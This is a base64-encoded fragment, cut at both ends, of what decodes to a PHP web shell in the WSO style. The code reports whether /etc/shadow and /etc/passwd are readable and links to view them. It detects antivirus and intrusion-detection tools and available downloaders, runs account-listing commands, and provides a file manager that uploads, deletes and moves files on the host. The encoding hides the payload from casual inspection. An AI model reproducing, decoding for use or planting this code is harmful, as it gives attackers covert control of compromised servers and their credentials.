dXJuICc8Zm9udCBjb2xvcj13aGl0ZT48Yj4nIC4gcGVybXMoQGZpbGVwZXJtcygkZikpIC4gJzwvYj48L2ZvbnQ+JzsKICAgIGVsc2UKICAgICAgICByZXR1cm4gJzxmb250IGNvbG9yPSMwMEJCMDA+PGI+JyAuIHBlcm1zKEBmaWxlcGVybXMoJGYpKSAuICc8L2I+PC9mb250Pic7Cn0KCmlmICghZnVuY3Rpb25fZXhpc3RzKCJzY2FuZGlyIikpIHsKICAgIGZ1bmN0aW9uIHNjYW5kaXIoJGRpcikKICAgIHsKICAgICAgICAkZGggPSBvcGVuZGlyKCRkaXIpOwogICAgICAgIHdoaWxlIChmYWxzZSAhPT0gKCRmaWxlbmFtZSA9IHJlYWRkaXIoJGRoKSkpIHsKICAgICAgICAgICAgJGZpbGVzW10gPSAkZmlsZW5hbWU7CiAgICAgICAgfQogICAgICAgIHJldHVybiAkZmlsZXM7CiAgICB9Cn0KCmZ1bmN0aW9uIGFjdGlvblNlY0luZm8oKQp7CiAgICBwcmludEhlYWRlcigpOwogICAgZWNobyAnPGgxPlNlcnZlciBzZWN1cml0eSBpbmZvcm1hdGlvbjwvaDE+PGRpdiBjbGFzcz1jb250ZW50Pic7CiAgICBmdW5jdGlvbiBzaG93U2VjUGFyYW0oJG4sICR2KQogICAgewogICAgICAgICR2ID0gdHJpbSgkdik7CiAgICAgICAgaWYgKCR2KSB7CiAgICAgICAgICAgIGVjaG8gJzxzcGFuPicgLiAkbiAuICc6IDwvc3Bhbj4nOwogICAgICAgICAgICBpZiAoc3RycG9zKCR2LCAiXG4iKSA9PT0gZmFsc2UpCiAgICAgICAgICAgICAgICBlY2hvICR2IC4gJzxicj4nOwogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICBlY2hvICc8cHJlIGNsYXNzPW1sMT4nIC4gJHYgLiAnPC9wcmU+JzsKICAgICAgICB9CiAgICB9CiAgICAKICAgIHNob3dTZWNQYXJhbSgnU2VydmVyIHNvZnR3YXJlJywgQGdldGVudignU0VSVkVSX1NPRlRXQVJFJykpOwogICAgc2hvd1NlY1BhcmFtKCdEaXNhYmxlZCBQSFAgRnVuY3Rpb25zJywgKCRHTE9CQUxTWydkaXNhYmxlX2Z1bmN0aW9ucyddKSA/ICRHTE9CQUxTWydkaXNhYmxlX2Z1bmN0aW9ucyddIDogJ25vbmUnKTsKICAgIHNob3dTZWNQYXJhbSgnT3BlbiBiYXNlIGRpcicsIEBpbmlfZ2V0KCdvcGVuX2Jhc2VkaXInKSk7CiAgICBzaG93U2VjUGFyYW0oJ1NhZmUgbW9kZSBleGVjIGRpcicsIEBpbmlfZ2V0KCdzYWZlX21vZGVfZXhlY19kaXInKSk7CiAgICBzaG93U2VjUGFyYW0oJ1NhZmUgbW9kZSBpbmNsdWRlIGRpcicsIEBpbmlfZ2V0KCdzYWZlX21vZGVfaW5jbHVkZV9kaXInKSk7CiAgICBzaG93U2VjUGFyYW0oJ2NVUkwgc3VwcG9ydCcsIGZ1bmN0aW9uX2V4aXN0cygnY3VybF92ZXJzaW9uJykgPyAnZW5hYmxlZCcgOiAnbm8nKTsKICAgICR0ZW1wID0gYXJyYXkoKTsKICAgIGlmIChmdW5jdGlvbl9leGlzdHMoJ215c3FsX2dldF9jbGllbnRfaW5mbycpKQogICAgICAgICR0ZW1wW10gPSAiTXlTcWwgKCIgLiBteXNxbF9nZXRfY2xpZW50X2luZm8oKSAuICIpIjsKICAgIGlmIChmdW5jdGlvbl9leGlzdHMoJ21zc3FsX2Nvbm5lY3QnKSkKICAgICAgICAkdGVtcFtdID0gIk1TU1FMIjsKICAgIGlmIChmdW5jdGlvbl9leGlzdHMoJ3BnX2Nvbm5lY3QnKSkKICAgICAgICAkdGVtcFtdID0gIlBvc3RncmVTUUwiOwogICAgaWYgKGZ1bmN0aW9uX2V4aXN0cygnb2NpX2Nvbm5lY3QnKSkKICAgICAgICAkdGVtcFtdID0gIk9yYWNsZSI7CiAgICBzaG93U2VjUGFyYW0oJ1N1cHBvcnRlZCBkYXRhYmFzZXMnLCBpbXBsb2RlKCcsICcsICR0ZW1wKSk7CiAgICBlY2hvICc8YnI+JzsKICAgIAogICAgaWYgKCRHTE9CQUxTWydvcyddID09ICduaXgnKSB7CiAgICAgICAgJHVzZXJmdWwgICAgID0gYXJyYXkoCiAgICAgICAgICAgICdnY2MnLAogICAgICAgICAgICAnbGNjJywKICAgICAgICAgICAgJ2NjJywKICAgICAgICAgICAgJ2xkJywKICAgICAgICAgICAgJ21ha2UnLAogICAgICAgICAgICAncGhwJywKICAgICAgICAgICAgJ3BlcmwnLAogICAgICAgICAgICAncHl0aG9uJywKICAgICAgICAgICAgJ3J1YnknLAogICAgICAgICAgICAndGFyJywKICAgICAgICAgICAgJ2d6aXAnLAogICAgICAgICAgICAnYnppcCcsCiAgICAgICAgICAgICdiemlwMicsCiAgICAgICAgICAgICduYycsCiAgICAgICAgICAgICdsb2NhdGUnLAogICAgICAgICAgICAnc3VpZHBlcmwnCiAgICAgICAgKTsKICAgICAgICAkZGFuZ2VyICAgICAgPSBhcnJheSgKICAgICAgICAgICAgJ2thdicsCiAgICAgICAgICAgICdub2QzMicsCiAgICAgICAgICAgICdiZGNvcmVkJywKICAgICAgICAgICAgJ3V2c2NhbicsCiAgICAgICAgICAgICdzYXYnLAogICAgICAgICAgICAnZHJ3ZWJkJywKICAgICAgICAgICAgJ2NsYW1kJywKICAgICAgICAgICAgJ3JraHVudGVyJywKICAgICAgICAgICAgJ2Noa3Jvb3RraXQnLAogICAgICAgICAgICAnaXB0YWJsZXMnLAogICAgICAgICAgICAnaXBmdycsCiAgICAgICAgICAgICd0cmlwd2lyZScsCiAgICAgICAgICAgICdzaGllbGRjYycsCiAgICAgICAgICAgICdwb3J0c2VudHJ5JywKICAgICAgICAgICAgJ3Nub3J0JywKICAgICAgICAgICAgJ29zc2VjJywKICAgICAgICAgICAgJ2xpZHNhZG0nLAogICAgICAgICAgICAndGNwbG9kZycsCiAgICAgICAgICAgICdzeGlkJywKICAgICAgICAgICAgJ2xvZ2NoZWNrJywKICAgICAgICAgICAgJ2xvZ3dhdGNoJywKICAgICAgICAgICAgJ3N5c21hc2snLAogICAgICAgICAgICAnem1ic2NhcCcsCiAgICAgICAgICAgICdzYXdtaWxsJywKICAgICAgICAgICAgJ3dvcm1zY2FuJywKICAgICAgICAgICAgJ25pbmphJwogICAgICAgICk7CiAgICAgICAgJGRvd25sb2FkZXJzID0gYXJyYXkoCiAgICAgICAgICAgICd3Z2V0JywKICAgICAgICAgICAgJ2ZldGNoJywKICAgICAgICAgICAgJ2x5bngnLAogICAgICAgICAgICAnbGlua3MnLAogICAgICAgICAgICAnY3VybCcsCiAgICAgICAgICAgICdnZXQnLAogICAgICAgICAgICAnbHdwLW1pcnJvcicKICAgICAgICApOwogICAgICAgIHNob3dTZWNQYXJhbSgnUmVhZGFibGUgL2V0Yy9wYXNzd2QnLCBAaXNfcmVhZGFibGUoJy9ldGMvcGFzc3dkJykgPyAieWVzIDxhIGhyZWY9JyMnIG9uY2xpY2s9J2coXCJGaWxlc1Rvb2xzXCIsIFwiL2V0Yy9cIiwgXCJwYXNzd2RcIiknPlt2aWV3XTwvYT4iIDogJ25vJyk7CiAgICAgICAgc2hvd1NlY1BhcmFtKCdSZWFkYWJsZSAvZXRjL3NoYWRvdycsIEBpc19yZWFkYWJsZSgnL2V0Yy9zaGFkb3cnKSA/ICJ5ZXMgPGEgaHJlZj0nIycgb25jbGljaz0nZyhcIkZpbGVzVG9vbHNcIiwgXCJldGNcIiwgXCJzaGFkb3dcIiknPlt2aWV3XTwvYT4iIDogJ25vJyk7CiAgICAgICAgc2hvd1NlY1BhcmFtKCdPUyB2ZXJzaW9uJywgQGZpbGVfZ2V0X2NvbnRlbnRzKCcvcHJvYy92ZXJzaW9uJykpOwogICAgICAgIHNob3dTZWNQYXJhbSgnRGlzdHIgbmFtZScsIEBmaWxlX2dldF9jb250ZW50cygnL2V0Yy9pc3N1ZS5uZXQnKSk7CiAgICAgICAgaWYgKCEkR0xPQkFMU1snc2FmZV9tb2RlJ10pIHsKICAgICAgICAgICAgZWNobyAnPGJyPic7CiAgICAgICAgICAgICR0ZW1wID0gYXJyYXkoKTsKICAgICAgICAgICAgZm9yZWFjaCAoJHVzZXJmdWwgYXMgJGl0ZW0pCiAgICAgICAgICAgICAgICBpZiAod2hpY2goJGl0ZW0pKSB7CiAgICAgICAgICAgICAgICAgICAgJHRlbXBbXSA9ICRpdGVtOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICBzaG93U2VjUGFyYW0oJ1VzZXJmdWwnLCBpbXBsb2RlKCcsICcsICR0ZW1wKSk7CiAgICAgICAgICAgICR0ZW1wID0gYXJyYXkoKTsKICAgICAgICAgICAgZm9yZWFjaCAoJGRhbmdlciBhcyAkaXRlbSkKICAgICAgICAgICAgICAgIGlmICh3aGljaCgkaXRlbSkpIHsKICAgICAgICAgICAgICAgICAgICAkdGVtcFtdID0gJGl0ZW07CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIHNob3dTZWNQYXJhbSgnRGFuZ2VyJywgaW1wbG9kZSgnLCAnLCAkdGVtcCkpOwogICAgICAgICAgICAkdGVtcCA9IGFycmF5KCk7CiAgICAgICAgICAgIGZvcmVhY2ggKCRkb3dubG9hZGVycyBhcyAkaXRlbSkKICAgICAgICAgICAgICAgIGlmICh3aGljaCgkaXRlbSkpIHsKICAgICAgICAgICAgICAgICAgICAkdGVtcFtdID0gJGl0ZW07CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIHNob3dTZWNQYXJhbSgnRG93bmxvYWRlcnMnLCBpbXBsb2RlKCcsICcsICR0ZW1wKSk7CiAgICAgICAgICAgIGVjaG8gJzxici8+JzsKICAgICAgICAgICAgc2hvd1NlY1BhcmFtKCdIb3N0cycsIEBmaWxlX2dldF9jb250ZW50cygnL2V0Yy9ob3N0cycpKTsKICAgICAgICAgICAgc2hvd1NlY1BhcmFtKCdIREQgc3BhY2UnLCBleCgnZGYgLWgnKSk7CiAgICAgICAgICAgIHNob3dTZWNQYXJhbSgnTW91bnQgb3B0aW9ucycsIEBmaWxlX2dldF9jb250ZW50cygnL2V0Yy9mc3RhYicpKTsKICAgICAgICB9CiAgICB9IGVsc2UgewogICAgICAgIHNob3dTZWNQYXJhbSgnT1MgVmVyc2lvbicsIGV4KCd2ZXInKSk7CiAgICAgICAgc2hvd1NlY1BhcmFtKCdBY2NvdW50IFNldHRpbmdzJywgZXgoJ25ldCBhY2NvdW50cycpKTsKICAgICAgICBzaG93U2VjUGFyYW0oJ1VzZXIgQWNjb3VudHMnLCBleCgnbmV0IHVzZXInKSk7CiAgICB9CiAgICBlY2hvICc8L2Rpdj4nOwogICAgcHJpbnRGb290ZXIoKTsKfQoKZnVuY3Rpb24gYWN0aW9uRmlsZXNNYW4oKQp7CiAgICBwcmludEhlYWRlcigpOwogICAgZWNobyAnPGgxPkZpbGUgbWFuYWdlcjwvaDE+PGRpdiBjbGFzcz1jb250ZW50Pic7CiAgICBpZiAoaXNzZXQoJF9QT1NUWydwMSddKSAmJiAkX1BPU1RbJ3AxJ10gIT0gJ2RlZmFjZScpIHsKICAgICAgICBzd2l0Y2ggKCRfUE9TVFsncDEnXSkgewogICAgICAgICAgICBjYXNlICd1cGxvYWRGaWxlJzoKICAgICAgICAgICAgICAgIGlmICghQG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWydmJ11bJ3RtcF9uYW1lJ10sICRfRklMRVNbJ2YnXVsnbmFtZSddKSkKICAgICAgICAgICAgICAgICAgICBlY2hvICJDYW4ndCB1cGxvYWQgZmlsZSEiOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgY2FzZSAnbWtkaXInOgogICAgICAgICAgICAgICAgaWYgKCFAbWtkaXIoJF9QT1NUWydwMiddKSkKICAgICAgICAgICAgICAgICAgICBlY2hvICJDYW4ndCBjcmVhdGUgbmV3IGRpciI7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgY2FzZSAnZGVsZXRlJzoKICAgICAgICAgICAgICAgIGZ1bmN0aW9uIGRlbGV0ZURpcigkcGF0aCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkcGF0aCA9IChzdWJzdHIoJHBhdGgsIC0xKSA9PSAnLycpID8gJHBhdGggOiAkcGF0aCAuICcvJzsKICAgICAgICAgICAgICAgICAgICAkZGggICA9IG9wZW5kaXIoJHBhdGgpOwogICAgICAgICAgICAgICAgICAgIHdoaWxlICgoJGl0ZW0gPSByZWFkZGlyKCRkaCkpICE9PSBmYWxzZSkgewogICAgICAgICAgICAgICAgICAgICAgICAkaXRlbSA9ICRwYXRoIC4gJGl0ZW07CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgoYmFzZW5hbWUoJGl0ZW0pID09ICIuLiIpIHx8IChiYXNlbmFtZSgkaXRlbSkgPT0gIi4iKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICAgICAgICAgICAgICAkdHlwZSA9IGZpbGV0eXBlKCRpdGVtKTsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCR0eXBlID09ICJkaXIiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZGVsZXRlRGlyKCRpdGVtKTsKICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgQHVubGluaygkaXRlbSk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGNsb3NlZGlyKCRkaCk7CiAgICAgICAgICAgICAgICAgICAgcm1kaXIoJHBhdGgpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKGlzX2FycmF5KEAkX1BPU1RbJ2YnXSkpCiAgICAgICAgICAgICAgICAgICAgZm9yZWFjaCAoJF9QT1NUWydmJ10gYXMgJGYpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGYgPSB1cmxkZWNvZGUoJGYpOwogICAgICAgICAgICAgICAgICAgICAgICBpZiAoaXNfZGlyKCRmKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRlbGV0ZURpcigkZik7CiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEB1bmxpbmsoJGYpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAKICAgICAgICAgICAgCiAgICAgICAgICAgIAogICAgICAgICAgICAKICAgICAgICAgICAgY2FzZSAncGFzdGUnOgogICAgICAgICAgICAgICAgaWYgKCRfU0VTU0lPTlsnYWN0J10gPT0gJ2NvcHknKSB7CiAgICAgICAgICAgICAgICAgICAgZnVuY3Rpb24gY29weV9wYXN0ZSgkYywgJHMsICRkKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGlzX2RpcigkYyAuICRzKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgbWtkaXIoJGQgLiAkcyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaCA9IG9wZW5kaXIoJGMgLiAkcyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aGlsZSAoKCRmID0gcmVhZGRpcigkaCkpICE9PSBmYWxzZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoKCRmICE9ICIuIikgYW5kICgkZiAhPSAiLi4iKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb3B5X3Bhc3RlKCRjIC4gJHMgLiAnLycsICRmLCAkZCAuICRzIC4gJy8nKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZWlmIChpc19maWxlKCRjIC4gJHMpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBAY29weSgkYyAuICRzLCAkZCAuICRzKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBmb3JlYWNoICgkX1NFU1NJT05bJ2YnXSBhcyAkZikKICAgICAgICAgICAgICAgICAgICAgICAgY29weV9wYXN0ZSgkX1NFU1NJT05bJ2N3ZCddLCAkZiwgJEdMT0JBTFNbJ2N3ZCddKTsKICAgICAgICAgICAgICAgIH0gZWxzZWlmICgkX1NFU1NJT05bJ2FjdCddID09ICdtb3ZlJykgewogICAgICAgICAgICAgICAgICAgIGZ1bmN0aW9uIG1vdmVfcGFzdGUoJGMsICRzLCAkZCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChpc19kaXIoJGMgLiAkcykpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG1rZGlyKCRkIC4gJHMpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGggPSBvcGVuZGlyKCRjIC4gJHMpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgd2hpbGUgKCgkZiA9IHJlYWRkaXIoJGgpKSAhPT0gZmFsc2UpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCgkZiAhPSAiLiIpIGFuZCAoJGYgIT0gIi4uIikpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29weV9wYXN0ZSgkYyAuICRzIC4gJy8nLCAkZiwgJGQgLiAkcyAuICcvJyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2VpZiAoaXNfZmlsZSgkYyAuICRzKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgQGNvcHkoJGMgLiAkcywgJGQgLiAkcyk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZm9yZWFjaCAoJF9TRVNTSU9OWydmJ10gYXMgJGYpCiAgICAgICAgICAgICAgICAgICAgICAgIEByZW5hbWUoJF9TRVNTSU9OWydjd2QnXSAuICRmLCAkR0xPQkFMU1snY3dkJ10gLiAkZik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB1bnNldCgkX1NFU1NJT05bJ2YnXSk7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgZGVmYXVsdDoKICAgICAgICAgICAgICAgIGlmICghZW1wdHkoJF9QT1NUWydwMSddKSAmJiAoKCRfUE9TVFsncDEnXSA9PSAnY29weScpIHx8ICgkX1BPU1RbJ3AxJ10gPT0gJ21vdmUnKSkpIHsKICAgICAgICAgICAgICAgICAgICAkX1NFU1NJT05bJ2FjdCddID0gQCRfUE9TVFsncDEnXTsKICAgICAgICAgICAgICAgICAgICAkX1NFU1NJT05bJ2YnXSAgID0gQCRfUE9TVFsnZiddOwogICAgICAgICAgICAgICAgICAgIGZvcmVhY2ggKCRfU0VTU0lPTlsnZiddIGFzICRrID0+ICRmKQogICAgICAgICAgICAgICAgICAgICAgICAkX1NFU1NJT05bJ2YnXVska10gPSB1cmxkZWNvZGUoJGYpOwogICAgICAgICAgICAgICAgICAgICRfU0VTU0lPTlsnY3dkJ10gPSBAJF9QT1NUWydjJ107CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICB9CiAgICAgICAgZWNobyAnPHNjcmlwdD5kb2N1bWVudC5tZi5wMS52YWx1ZT0iIjtkb2N1bWVudC5tZi5wMi52YWx1ZT0iIjs8L3NjcmlwdD4nOwogICAgfQogICAgCiAgICAkZGlyQ29udGVudCA9IEBzY2FuZGlyKGlzc2V0KCRfUE9TVFsnYyddKSA/ICRfUE9TVFsnYyddIDogJEdMT0JBTFNbJ2N3ZCddKTsKICAgIGlmICgkZGlyQ29udGVudCA9PT0gZmFsc2UpIHsKICAgICAgICBlY2hvICdDYW5cJ3Qgb3BlbiB0aGlzIGZvbGRlciEnOwogICAgICAgIHJldHVybjsKICAgIH0KICAgIGdsb2JhbCAkc29ydDsKICAgICRzb3J0ID0gYXJyYXkoCiAgICAgICAgJ25hbWUnLAogICAgICAgIDEKICAgICk7CiAgICBpZiAoIWVtcHR5KCRfUE9TVFsncDEnXSkpIHsKICAgICAgICBpZiAocHJlZ19tYXRjaCgnIXNfKFtBLXpdKylfKFxkezF9KSEnLCAkX1BPU1RbJ3AxJ10sICRtYXRjaCkpCiAgICAgICAgICAgICRzb3J0ID0gYXJyYXkoCiAgICAgICAgICAgICAgICAkbWF0Y2hbMV0sCiAgICAgICAgICAgICAgICAoaW50KSAkbWF0Y2hbMl0KICAgICAgICAgICAgKTsKICAgIH0KICAgIGVjaG8gJzxzY3JpcHQ+CiAgICAgICAgZnVuY3Rpb24gc2EoKSB7CiAgICAgICAgICAgIGZvcihpPTA7aTxkb2N1bWVudC5maWxlcy5lbGVtZW50cy5sZW5ndGg7aSsrKQogICAgICAgICAgICBpZihkb2N1bWVudC5maWxlcy5lbGVtZW50c1tpXS50eXBlID09IFwnY2hlY2tib3hcJykKICAgICAgICAgICAgICAgIGRvY3VtZW50LmZpbGVzLmVsZW1lbnRzW2ldLmNoZWNrZWQgPSBkb2N1bWVudC5maWxlcy5lbGVtZW50c1swXS5jaGVja2VkOwogICAgICAgIH0KICAgICAgICA8L3NjcmlwdD4KICAgICAgICA8dGFibGUgd2lkdGg9XCcxMDAlXCcgY2xhc3M9XCdtYWluXCcgY2VsbHNwYWNpbmc9XCcwXCcgY2VsbHBhZGRpbmc9XCcyXCc+CiAgICAgICAgPGZvcm0gbmFtZT1maWxlcyBtZXRob2Q9cG9zdD4nOwogICAgZWNobyAiPHRyPjx0aCB3aWR0aD0nMTNweCc+PGlucHV0IHR5cGU9Y2hlY2tib3ggb25jbGljaz0nc2EoKScgY2xhc3M9Y2hrYng+PC90aD48dGg+PGEgaHJlZj0nIycgb25jbGljaz0nZyhcIkZpbGVzTWFuXCIsbnVsbCxcInNfbmFtZV8iIC4gKCRzb3J0WzFdID8gMCA6IDEpIC4gIlwiKSc+TmFtZTwvYT48L3RoPjx0aD48YSBocmVmPScjJyBvbmNsaWNrPSdnKFwiRmlsZXNNYW5cIixudWxsLFwic19zaXplXyIgLiAoJHNvcnRbMV0gPyAwIDogMSkgLiAiXCIpJz5TaXplPC9hPjwvdGg+PHRoPjxhIGhyZWY9JyMnIG9uY2xpY2s9J2coXCJGaWxlc01hblwiLG51bGwsXCJzX21vZGlmeV8iIC4gKCRzb3J0WzFdID8gMCA6IDEpIC4gIlwiKSc+TW9kaWZ5PC9hPjwvdGg+PHRoPk93bmVyL0dyb3VwPC90aD48dGg+PGEgaHJlZj0nIycgb25jbGljaz0nZyhcIkZpbGVzTWFuXCIsbnVsbCxcInNfcGVybXNfIiAuICgkc29ydFsxXSA/IDAgOiAxKSAuICJcIiknPlBlcm1pc3Npb25zPC9hPjwvdGg+PHRoPkFjdGlvbnM8L3RoPjwvdHI+IjsKICAgICRkaXJzID0gJGZpbGVzID0gJGxpbmtzID0gYXJyYXkoKTsKICAgICRuICAgID0gY291bnQoJGRpckNvbnRlbnQpOwogICAgZm9yICgkaSA9IDA7ICRpIDwgJG47ICRpKyspIHsKICAgICAgICAkb3cgID0gQHBvc2l4X2dldHB3dWlkKEBmaWxlb3duZXIoJGRpckNvbnRlbnRbJGldKSk7CiAgICAgICAgJGdyICA9IEBwb3NpeF9nZXRncmdpZChAZmlsZWdyb3VwKCRkaXJDb250ZW50WyRpXSkpOwogICAgICAgICR0bXAgPSBhcnJheSgKICAgICAgICAgICAgJ25hbWUnID0+ICRkaXJDb250ZW50WyRpXSwKICAgICAgICAgICAgJ3BhdGgnID0+ICRHTE9CQUxTWydjd2QnXSAuICRkaXJDb250ZW50WyRpXSwKICAgICAgICAgICAgJ21vZGlmeScgPT4gQGRhdGUoJ1ktbS1kIEg6aTpzJywgQGZpbGVtdGltZSgkR0xPQkFMU1snY3dkJ10gLiAkZGlyQ29udGVudFskaV0pKSwKICAgICAgICAgICAgJ3Blcm1zJyA9PiB2aWV3UGVybXNDb2xvcigkR0xPQkFMU1snY3dkJ10gLiAkZGlyQ29udGVudFskaV0pLAogICAgICAgICAgICAnc2l6ZScgPT4gQGZpbGVzaXplKCRHTE9CQUxTWydjd2QnXSAuICRkaXJDb250ZW50WyRpXSksCiAgICAgICAgICAgICdvd25lcicgPT4gJG93WyduYW1lJ10gPyAkb3dbJ25hbWUnXSA6IEBmaWxlb3duZXIoJGRpckNvbnRlbnRbJGldKSwKICAgICAgICAgICAgJ2dyb3VwJyA9PiAkZ3JbJ25hbWUnXSA/ICRnclsnbmFtZSddIDogQGZpbGVncm91cCgkZGlyQ29udGVudFskaV0pCiAgICAgICAgKTsKICAgICAgICBpZiAoQGlzX2ZpbGUoJEdMT0JBTFNbJ2N3ZCddIC4gJGRpckNvbnRlbnRbJGldKSkKICAgICAgICAgICAgJGZpbGVzW10gPSBhcnJheV9tZXJnZSgkdG1wLCBhcnJheSgKICAgICAgICAgICAgICAgICd0eXBlJyA9PiAnZmlsZScKICAgICAgICAgICAgKSk7CiAgICAgICAgZWxzZWlmIChAaXNfbGluaygkR0xPQkFMU1snY3dkJ10gLiAkZGlyQ29udGVudFskaV0pKQogICAgICAgICAgICAkbGlua3NbXSA9IGFycmF5X21lcmdlKCR0bXAsIGFycmF5KAogICAgICAgICAgICAgICAgJ3R5cGUnID0+ICdsaW5rJwogICAgICAgICAgICApKTsKICAgICAgICBlbHNlaWYgKEBpc19kaXIoJEdMT0JBTFNbJ2N3ZCddIC4gJGRpckNvbnRlbnRbJGldKSAmJiAoJGRpckNvbnRlbnRbJGldICE9ICIuIikpCiAgICAgICAgICAgICRkaXJzW10gPSBhcnJheV9tZXJnZSgkdG1wLCBhcnJheSgKICAgICAgICAgICAgICAgICd0eXBlJyA9PiAnZGlyJwogICAgICAgICAgICApKTsKICAgIH0KICAgICRHTE9CQUxTWydzb3J0J10gPSAkc29ydDsKICAgIGZ1bmN0aW9uIGNtcCgkYSwgJGIpCiAgICB7CiAgICAgICAgaWYgKCRHTE9CQUxTWydzb3J0J11bMF0gIT0gJ3NpemUnKQogICAgICAgICAgICByZXR1cm4gc3RyY21wKCRhWyRHTE9CQUxTWydzb3J0J11bMF1dLCAkYlskR0xPQkFMU1snc29ydCddWzBdXSkgKiAoJEdMT0JBTFNbJ3NvcnQnXVsxXSA/IDEgOiAtMSk7CiAgICAgICAgZWxzZQogICAgICAgICAgICByZXR1cm4gKCgkYVsnc2l6ZSddIDwgJGJbJ3NpemUnXSkgPyAtMSA6IDEpICogKCRHTE9CQUxTWydzb3J0J11bMV0gPyAxIDogLTEpOwogICAgfQogICAgdXNvcnQoJGZpbGVzLCAiY21wIik7CiAgICB1c29ydCgkZGlycywgImNtcCIpOwogICAgdXNvcnQoJGxpbmtzLCAiY21wIik7CiAgICAkZmlsZXMgPSBhcnJheV9tZXJnZSgkZGlycywgJGxpbmtzLCAkZmlsZXMpOwogICAgJGwgICAgID0gMDsKICAgIGZvcmVhY2ggKCRmaWxlcyBhcyAkZikgewogICAgICAgIGVjaG8gJzx0cicgLiAoJGwgPyAnIGNsYXNzPWwxJyA6ICcnKSAuICc+PHRkPjxpbnB1dCB0eXBlPWNoZWNrYm94IG5hbWU9ImZbXSIgdmFsdWU9IicgLiB1cmxlbmNvZGUoJGZbJ25hbWUnXSkgLiAnIiBjbGFzcz1jaGtieD48L3RkPjx0ZD48YSBocmVmPSMgb25jbGljaz0iJyAuICgoJGZbJ3R5cGUnXSA9PSAnZmlsZScpID8gJ2coXCdGaWxlc1Rvb2xzXCcsbnVsbCxcJycgLiB1cmxlbmNvZGUoJGZbJ25hbWUnXSkgLiAnXCcsIFwndmlld1wnKSI+JyAuIGh0bWxzcGVjaWFsY2hhcnMoJGZbJ25hbWUnXSkgOiAnZyhcJ0ZpbGVzTWFuXCcsXCcnIC4gJGZbJ3BhdGgnXSAuICdcJyk7Ij48Yj5bICcgLiBodG1sc3BlY2lhbGNoYXJzKCRmWyduYW1lJ10pIC4gJyBdPC9iPicpIC4gJzwvYT48L3RkPjx0ZD4nIC4gKCgkZlsndHlwZSddID09ICdmaWxlJykgPyB2aWV3U2l6ZSgkZlsnc2l6ZSddKSA6ICRmWyd0eXBlJ10pIC4gJzwvdGQ+PHRkPicgLiAkZlsnbW9kaWZ5J10gLiAnPC90ZD48dGQ+JyAuICRmWydvd25lciddIC4gJy8nIC4gJGZbJ2dyb3VwJ10gLiAnPC90ZD48dGQ+PGEgaHJlZj0jIG9uY2xpY2s9ImcoXCdGaWxlc1Rvb2xzXCcsbnVsbCxcJycgLiB1cmxlbmNvZGUoJGZbJ25hbWUnXSkgLiAnXCcsXCdjaG1vZFwnKSI+JyAuICRmWydwZXJtcyddIC4gJzwvdGQ+PHRkPjxhIGhyZWY9IiMiIG9uY2xpY2s9ImcoXCdGaWxlc1Rvb2xzXCcsbnVsbCxcJycgLiB1cmxlbmNvZGUoJGZbJ25hbWUnXSkgLiAnXCcsIFwncmVuYW1lXCcpIj5SPC9hPiA8YSBocmVmPSIjIiBvbmNsaWNrPSJnKFwnRmlsZXNUb29sc1wnLG51bGwsXCcnIC4gdXJsZW5jb2RlKCRmWyduYW1lJ10pIC4gJ1wnLCBcJ3RvdWNoXCcpIj5UPC9hPicgLiAoKCRmWyd0eXBlJ10gPT0gJ2ZpbGUnKSA/ICcgPGEgaHJlZj0iIyIgb25jbGljaz0iZyhcJ0ZpbGVzVG9vbHNcJyx